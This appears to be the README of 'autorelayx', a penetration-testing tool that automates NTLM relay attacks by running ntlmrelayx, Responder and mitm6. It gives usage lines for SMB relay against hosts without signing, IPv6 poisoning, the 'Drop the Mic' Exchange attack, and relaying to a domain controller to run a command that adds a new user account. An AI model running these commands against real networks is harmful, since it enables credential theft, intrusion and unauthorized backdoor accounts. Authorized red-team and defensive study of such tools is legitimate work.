Autorelayx
=======

Automates the process of setting up advanced relaying techniques.

# Installation

    git clone --recurse-submodules https://github.com/Coalfire-Research/autorelayx
    cd autorelayx
    sudo pipenv install
    sudo pipenv shell

# Usage

## SMB relay
Hostlist should be formatted in CIDR notation (192.168.0.0/24) or individual IPs separated by a newline. This will
scan the hosts in the hostlist for any that do not have SMB signing enabled and write them to unsigned-smb-hosts.txt.
Runs ntlmrelayx.py and Responder.

```python autorelayx.py -l hostlist.txt```

## IPv6 poisoning
This will run ntlmrelayx, Responder, and mitm6. It is suggested to use the -d <domain> argument to limit mitm6's responses.

```python autorelayx.py -l hostlist.txt -6 -d CONTOSO```

## Relaying to single target and running a custom command once successful
```python autorelayx.py -t smb://dc01.local -c "net user /add danmcinerney P@ssword123456"```

## Drop the Mic attack
```python autorelayx.py -dc 1.2.3.4 -u LAB/dan:P@ssw0rd@exchangeServer.lab.local```

## PrivExchange


## To do
* add support for PrivExchange
* add tests